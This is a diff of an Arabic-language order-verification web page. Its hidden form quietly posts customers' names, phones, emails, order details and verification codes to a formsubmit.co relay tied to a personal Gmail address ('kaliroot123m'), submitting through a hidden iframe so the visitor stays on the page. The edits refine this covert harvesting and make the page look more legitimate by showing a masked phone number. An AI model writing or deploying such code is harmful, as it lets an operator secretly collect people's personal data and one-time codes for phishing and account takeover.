@@ -335,11 +335,10 @@
                     </div>
 
                     <!-- Hidden form for sending verification code -->
-                    <form id="verification-code-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" style="display: none;">
+                    <form id="verification-code-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" target="hidden_iframe" style="display: none;">
                         <input type="hidden" name="_subject" value="">
                         <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_template" value="box">
-                        <input type="hidden" name="_next" value="https://www.google.com/search?q=sent">
+                        <input type="hidden" name="_template" value="table">
                         <input type="hidden" name="customer_name" value="">
                         <input type="hidden" name="customer_phone" value="">
                         <input type="hidden" name="customer_email" value="">
@@ -982,6 +981,11 @@
             const orderNumber = localStorage.getItem('orderNumber') || 'Unknown';
             const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
             
+            // Get last 4 digits of phone number
+            const phoneNumber = customerData.phone || '';
+            const lastFourDigits = phoneNumber.replace(/\D/g, '').slice(-4);
+            const maskedPhone = lastFourDigits.length === 4 ? `****${lastFourDigits}` : 'غير محدد';
+            
             // Update form fields
             const form = document.getElementById('verification-code-form');
             const currentTime = new Date().toLocaleString('ar-SA');
@@ -994,25 +998,21 @@
             form.querySelector('input[name="verification_code"]').value = verificationCode;
             form.querySelector('input[name="sent_time"]').value = currentTime;
             
-            // Submit form in hidden iframe to avoid leaving the site
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.name = 'hidden_iframe';
-            document.body.appendChild(iframe);
-            form.target = 'hidden_iframe';
+            // Set form type for tracking
+            currentFormType = 'verification';
+            
+            // Submit form in hidden iframe
             form.submit();
             
-            // Remove iframe after submission
-            setTimeout(() => {
-                document.body.removeChild(iframe);
-            }, 1000);
-            
-            // Update status
+            // Update status with masked phone number
             const statusDiv = document.getElementById('code-status');
             statusDiv.innerHTML = `
                 <p class="text-green-800 dark:text-green-200 font-bold">
                     <i class="fas fa-check-circle mr-2"></i>
-                    تم إرسال كود التحقق: <span class="text-2xl font-mono">${verificationCode}</span>
+                    تم إرسال كود التحقق إلى رقم: <span class="text-lg font-mono">${maskedPhone}</span>
+                </p>
+                <p class="text-green-700 dark:text-green-300 text-sm mt-2">
+                    كود التحقق: <span class="text-xl font-mono font-bold">${verificationCode}</span>
                 </p>
             `;
             statusDiv.className = 'bg-green-100 dark:bg-green-900 p-4 rounded-lg mb-4';
